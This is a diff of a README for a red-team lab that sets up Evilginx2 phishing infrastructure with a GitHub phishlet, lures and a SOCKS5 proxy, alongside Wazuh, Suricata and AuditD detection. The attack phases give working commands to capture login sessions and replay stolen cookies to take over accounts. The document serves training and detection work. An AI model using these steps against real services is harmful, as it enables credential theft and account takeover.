@@ -1,7 +1,7 @@
 # Red-Team-Phishing-Infrastructure-and-Detection-Simulation-using-Evilginx-and-Wazuh
 
-**Project Owner:** Adekilekun Fatiu
-**Date of Execution:** 07/07/2025
+**Project Owner:** Adekilekun Fatiu\
+**Date of Execution:** 07/07/2025\
 **Project Title:** Red Team Phishing Infrastructure and Detection Simulation using Evilginx and Wazuh
 
 ---
@@ -41,69 +41,70 @@ Simulate a real-world credential theft operation using Evilginx2 phishing proxy 
 
 ## 4. Infrastructure Design
 
-**VPS 1 (Attacker Node)**:
+**VPS 1 (Attacker Node):**
 
-* Evilginx2
-* Dante SOCKS5
-* Wazuh Agent
-* Suricata
-* AuditD
+- Evilginx2
+- Dante SOCKS5
+- Wazuh Agent
+- Suricata
+- AuditD
 
-**VPS 2 (Detection Node)**:
+**VPS 2 (Detection Node):**
 
-* Wazuh Manager (via Docker Compose)
-* Wazuh Dashboard
-* Wazuh Indexer
+- Wazuh Manager (Docker Compose)
+- Wazuh Dashboard
+- Wazuh Indexer
 
-SSH is restricted via key-based authentication on both VPS instances.
+Both servers use key-based SSH authentication only.
 
 ---
 
-## 5. Attack Simulation Phases
+## 5. Step-by-Step Execution
 
-### Phase 1: Environment Setup
+### Phase 1: Provisioning & DNS Setup
 
-```bash
-# Provision EC2
-# VPS 1: t2.micro (1GB RAM)
-# VPS 2: t2.large (8GB RAM)
-```
+1. **Provision EC2 VPS on AWS**
+   - VPS 1: t2.micro (1 GB RAM)
+   - VPS 2: t2.large (8 GB RAM)
+2. **Register a Domain on Namecheap**
+3. **Configure DNS records (A, CNAME) using AWS Hosted Zones**
 
-* Register test domain and configure DNS on AWS Hosted Zones
+### Phase 2: Evilginx2 & Dante Setup on VPS 1
 
-### Phase 2: Evilginx Setup (VPS 1)
+1. **Update and Install Essentials:**
 
 ```bash
 sudo apt update && sudo apt upgrade
 sudo apt install golang git -y
+```
 
-# Clone and build Evilginx
+2. **Clone and Build Evilginx2:**
+
+```bash
 cd /home/ubuntu
 git clone https://github.com/kgretzky/evilginx2.git
 cd evilginx2
 go build
-
-# Run test
 sudo ./evilginx2
 ```
 
-**Domain Setup:**
+3. **Configure Evilginx2:**
 
 ```bash
 config domain blakkhcloud.com
-config ipv4 YOUR.VPS1.IP
+config ipv4 <VPS1_PUBLIC_IP>
 phishlet hostname github github.blakkhcloud.com
 phishlet enable github
 ```
 
-**Dante SOCKS5 Setup:**
+4. **Install and Configure Dante:**
 
 ```bash
 sudo apt install dante-server -y
 sudo nano /etc/danted.conf
 ```
 
-Paste:
+Paste this config:
 
 ```conf
 logoutput: /var/log/danted.log
@@ -122,6 +123,8 @@ pass {
 }
 ```
 
+Then:
+
 ```bash
 sudo touch /var/log/danted.log
 sudo chmod 666 /var/log/danted.log
@@ -130,47 +133,48 @@ sudo systemctl start danted
 sudo ufw allow 1080/tcp
 ```
 
-**Test Proxy:**
+Test SOCKS proxy:
 
 ```bash
-curl -x socks5://<vps-ip>:1080 http://ifconfig.me
+curl -x socks5://<VPS1_PUBLIC_IP>:1080 http://ifconfig.me
 ```
 
-### Phase 3: Wazuh Manager Setup (VPS 2)
+### Phase 3: Wazuh Manager Deployment on VPS 2
+
+1. **Install Docker & Docker Compose:**
 
 ```bash
-sudo apt update && sudo apt upgrade
 curl -sSL https://get.docker.com | sh
 sudo systemctl start docker
 
-# Docker Compose
 curl -L "https://github.com/docker/compose/releases/download/v2.12.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
 chmod +x /usr/local/bin/docker-compose
+docker-compose --version
+```
 
-# Wazuh Docker
+2. **Deploy Wazuh Single Node:**
+
+```bash
 git clone https://github.com/wazuh/wazuh-docker.git -b v4.12.0
 cd wazuh-docker/single-node
 docker-compose -f generate-indexer-certs.yml run --rm generator
 docker-compose up -d
 ```
 
-### Phase 4: Wazuh Configuration (Manager)
+### Phase 4: Wazuh Configuration (VPS 2)
+
+1. **Edit **``**:**
 
 ```bash
 docker exec -it wazuh.manager bash
 nano /var/ossec/etc/ossec.conf
 ```
 
-Enable:
+Set:
 
 ```xml
 <logall>yes</logall>
 <enabled>yes</enabled>
-```
-
-Add:
-
-```xml
 <active-response>
   <command>firewall-drop</command>
   <location>local</location>
@@ -179,7 +183,7 @@ Add:
 </active-response>
 ```
 
-Exit and restart:
+Then:
 
 ```bash
 exit
@@ -188,7 +192,8 @@ docker-compose restart wazuh.manager
 
 ### Phase 5: Wazuh Agent Setup (VPS 1)
 
-Deploy via agent script from dashboard. Then:
+1. **Install Wazuh Agent via dashboard script**
+2. **Enable and Start Agent:**
 
 ```bash
 sudo systemctl daemon-reload
@@ -196,20 +201,15 @@ sudo systemctl enable wazuh-agent
 sudo systemctl start wazuh-agent
 ```
 
-### Phase 6: Log Source Integration (Agent)
+### Phase 6: Suricata & AuditD Log Forwarding (VPS 1)
 
-```bash
-# Edit config
-sudo nano /var/ossec/etc/ossec.conf
-```
-
-Add:
+1. **Configure Syscheck Monitoring:**
 
 ```xml
 <directories check_all="yes" report_changes="yes" realtime="yes">/home/ubuntu/evilginx2</directories>
 ```
 
-Install Suricata:
+2. **Install Suricata and Configure:**
 
 ```bash
 sudo add-apt-repository ppa:oisf/suricata-stable
@@ -217,41 +217,57 @@ sudo apt-get update
 sudo apt-get install suricata -y
 ```
 
-Configure `/etc/suricata/suricata.yaml` and add `eve.json` to ossec.conf.
+Edit `/etc/suricata/suricata.yaml` → Set HOME\_NET and EXTERNAL\_NET, and point rule path.
 
-Install AuditD:
+3. **Edit ossec.conf:**
+
+```xml
+<localfile>
+  <log_format>json</log_format>
+  <location>/var/log/suricata/eve.json</location>
+</localfile>
+```
+
+4. **Install AuditD and Set Audit Rules:**
 
 ```bash
 sudo apt install auditd
-nano /etc/audit/audit.rules
+sudo nano /etc/audit/audit.rules
 ```
 
-Paste:
+Add:
 
 ```bash
 -a exit,always -F arch=b64 -S execve -k audit-wazuh-c
 -a always,exit -F path=/home/ubuntu/evilginx2 -F perm=x -k evilginx_exec
 ```
 
-Reload:
+Then:
 
 ```bash
 sudo auditctl -R /etc/audit/audit.rules
 sudo augenrules --load
 ```
 
-### Phase 7: Attack Execution
+### Phase 7: Phishing Campaign Execution (VPS 1)
+
+1. **Create Phishing Lure:**
 
 ```bash
 lures create github
 lures edit <id> path /login
 lures edit <id> hostname github.blakkhcloud.com
 lures get-url <id>
+```
+
+2. **Check Sessions:**
+
+```bash
 sessions
 sessions <id>
 ```
 
-Replay cookies with EditThisCookie.
+3. **Replay Attack:** Use `EditThisCookie` to import session cookies and gain access to accounts.
 
 ---
 
@@ -269,31 +285,31 @@ Replay cookies with EditThisCookie.
 
 ## 7. Mitigation Recommendations
 
-* Block Evilginx signatures on IDS/IPS
-* Monitor Dante/Evilginx processes at endpoint
-* Enforce MFA, token refresh intervals
-* Adopt phishing-resistant authentication (e.g., passkeys)
-* Conduct phishing simulations and user awareness
+- Block Evilginx signatures on IDS/IPS
+- Monitor Dante/Evilginx processes at endpoint
+- Enforce MFA, token refresh intervals
+- Adopt phishing-resistant authentication (e.g., passkeys)
+- Conduct phishing simulations and user awareness
 
 ---
 
 ## 8. Lessons Learned
 
-* Evilginx2 is an effective phishing proxy
-* Wazuh, with custom rules, successfully detects red team behavior
-* SOCKS5 proxies provide good opsec and traffic obfuscation
-* Suricata and AuditD enhance visibility on low-level behavior
+- Evilginx2 is an effective phishing proxy
+- Wazuh, with custom rules, successfully detects red team behavior
+- SOCKS5 proxies provide good opsec and traffic obfuscation
+- Suricata and AuditD enhance visibility on low-level behavior
 
 ---
 
 ## 9. Project Deliverables
 
-* ✅ Evilginx phishlet templates
-* ✅ Custom Wazuh detection rules
-* ✅ Audit.rules for AuditD
-* ✅ Dante SOCKS5 proxy config (`danted.conf`)
-* ✅ `ossec.conf` templates for Wazuh Manager & Agent
-* ✅ Full setup + attack simulation guide (this file)
+- ✅ Evilginx phishlet templates
+- ✅ Custom Wazuh detection rules
+- ✅ Audit.rules for AuditD
+- ✅ Dante SOCKS5 proxy config (`danted.conf`)
+- ✅ `ossec.conf` templates for Wazuh Manager & Agent
+- ✅ Full setup + attack simulation guide (this file)
 
 ---
 
@@ -303,6 +319,7 @@ This project was executed in a private cloud lab environment solely for educatio
 
 ---
 
-**GitHub Repository:** \[Add Link Here]
-**Author:** Adekilekun Fatiu
+**GitHub Repository:** [Add Link Here]\
+**Author:** Adekilekun Fatiu\
 **License:** MIT or Educational Use Only
+
